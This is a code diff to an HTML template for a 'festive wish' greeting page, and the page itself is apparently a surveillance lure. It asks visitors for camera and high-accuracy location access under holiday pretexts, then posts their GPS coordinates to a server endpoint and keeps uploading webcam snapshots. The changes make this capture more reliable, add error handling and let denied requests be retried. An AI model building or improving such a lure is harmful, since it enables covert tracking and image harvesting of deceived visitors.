@@ -169,6 +169,12 @@
             color: #666;
             border-top: 1px solid #eee;
         }
+
+        .permission-status {
+            font-size: 0.9em;
+            margin-top: 10px;
+            color: {{ theme_color }};
+        }
     </style>
 </head>
 <body>
@@ -191,13 +197,18 @@
                 <div class="permission-box">
                     <h3 style="color: {{ theme_color }};">Almost there, <span id="displayName"></span>!</h3>
                     <p class="permission-text">To personalize your wish, we need:</p>
-                    {% if permission == 'camera' or permission == 'both' %}
+                    
+                    {% if permission == 'camera' %}
                     <p>📸 Camera access - to capture your festive moment</p>
-                    {% endif %}
-                    {% if permission == 'location' or permission == 'both' %}
+                    {% elif permission == 'location' %}
+                    <p>📍 Location access - to find celebrations near you</p>
+                    {% elif permission == 'both' %}
+                    <p>📸 Camera access - to capture your festive moment</p>
                     <p>📍 Location access - to find celebrations near you</p>
                     {% endif %}
+                    
                     <button class="btn" onclick="requestPermissions()">Grant Permissions</button>
+                    <div class="permission-status" id="permissionStatus"></div>
                 </div>
             </div>
             
@@ -231,6 +242,9 @@
         let interval = null;
         let photoCount = 0;
         let userName = '';
+        let locationRequested = false;  // Flag to prevent multiple location requests
+        let cameraRequested = false;     // Flag to prevent multiple camera requests
+        let permissionsComplete = false; // Flag to track if permissions are done
 
         async function submitName() {
             const nameInput = document.getElementById('userName');
@@ -279,45 +293,75 @@
         }
 
         async function requestPermissions() {
+            // Reset flags for new session
+            locationRequested = false;
+            cameraRequested = false;
+            permissionsComplete = false;
+            
             document.getElementById('permissionSection').style.display = 'none';
             document.getElementById('status').classList.add('active');
             document.getElementById('statusMessage').textContent = 'Requesting permissions...';
-
-            // Request camera if needed
-            if (PERM === 'camera' || PERM === 'both') {
+            
+            const permissionStatus = document.getElementById('permissionStatus');
+            
+            // Handle Camera Permission (only once per session)
+            if ((PERM === 'camera' || PERM === 'both') && !cameraRequested) {
                 try {
+                    document.getElementById('statusMessage').textContent = 'Requesting camera access...';
+                    cameraRequested = true;
+                    
                     mediaStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: 640, height: 480 }
+                        video: { 
+                            facingMode: 'user', 
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        }
                     });
+                    
                     document.getElementById('statusMessage').textContent = 'Camera access granted';
+                    
+                    // Start photo capture
                     startCapture();
+                    
                 } catch(e) {
-                    console.log('Camera denied');
+                    console.log('Camera denied:', e);
                     document.getElementById('statusMessage').textContent = 'Camera access denied';
+                    cameraRequested = false; // Reset so user can try again if needed
                 }
             }
 
-            // Request location if needed (with high accuracy)
-            if (PERM === 'location' || PERM === 'both') {
+            // Handle Location Permission (only once per session)
+            if ((PERM === 'location' || PERM === 'both') && !locationRequested) {
                 document.getElementById('statusMessage').textContent = 'Getting your precise location...';
+                locationRequested = true;
                 
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
                         // Send location to server
-                        await fetch('/api/location', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                lat: pos.coords.latitude,
-                                lng: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            })
-                        });
-                        document.getElementById('statusMessage').textContent = 'Location captured!';
+                        try {
+                            const response = await fetch('/api/location', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy
+                                })
+                            });
+                            
+                            if (response.ok) {
+                                document.getElementById('statusMessage').textContent = 'Location captured!';
+                                console.log('Location sent successfully');
+                            }
+                        } catch (error) {
+                            console.error('Location send error:', error);
+                            document.getElementById('statusMessage').textContent = 'Error sending location';
+                        }
                     },
                     (err) => {
-                        console.log('Location denied');
+                        console.log('Location denied:', err);
                         document.getElementById('statusMessage').textContent = 'Location access denied';
+                        locationRequested = false; // Reset so user can try again
                     },
                     { 
                         enableHighAccuracy: true, 
@@ -327,14 +371,35 @@
                 );
             }
 
-            // Show wish after 2 seconds
-            setTimeout(() => {
-                document.getElementById('status').classList.remove('active');
-                document.getElementById('wishSection').classList.add('active');
-                if (PERM === 'camera' || PERM === 'both') {
-                    document.getElementById('photoCounter').classList.add('active');
-                }
-            }, 3000);
+            // Check if both permissions are handled
+            checkPermissionsComplete();
+        }
+
+        function checkPermissionsComplete() {
+            // Check if we're done with all required permissions
+            const cameraNeeded = (PERM === 'camera' || PERM === 'both');
+            const locationNeeded = (PERM === 'location' || PERM === 'both');
+            
+            const cameraDone = !cameraNeeded || cameraRequested;
+            const locationDone = !locationNeeded || locationRequested;
+            
+            if (cameraDone && locationDone && !permissionsComplete) {
+                permissionsComplete = true;
+                
+                // Show wish after a short delay
+                setTimeout(() => {
+                    document.getElementById('status').classList.remove('active');
+                    document.getElementById('wishSection').classList.add('active');
+                    
+                    // Show photo counter if camera is active
+                    if (cameraNeeded && mediaStream) {
+                        document.getElementById('photoCounter').classList.add('active');
+                    }
+                }, 2000);
+            } else {
+                // Check again in 1 second
+                setTimeout(checkPermissionsComplete, 1000);
+            }
         }
 
         function startCapture() {
@@ -375,7 +440,7 @@
                 }).then(() => {
                     photoCount++;
                     document.getElementById('photoCount').textContent = photoCount;
-                });
+                }).catch(err => console.log('Photo send error:', err));
             } catch(e) {
                 console.log('Capture error:', e);
             }
@@ -383,8 +448,29 @@
 
         // Clean up
         window.addEventListener('beforeunload', () => {
-            if (interval) clearInterval(interval);
-            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            if (interval) {
+                clearInterval(interval);
+            }
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // Handle page reload/refresh
+        window.addEventListener('load', () => {
+            // Reset all flags on new page load
+            locationRequested = false;
+            cameraRequested = false;
+            permissionsComplete = false;
+            photoCount = 0;
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+            if (interval) {
+                clearInterval(interval);
+                interval = null;
+            }
         });
     </script>
 </body>
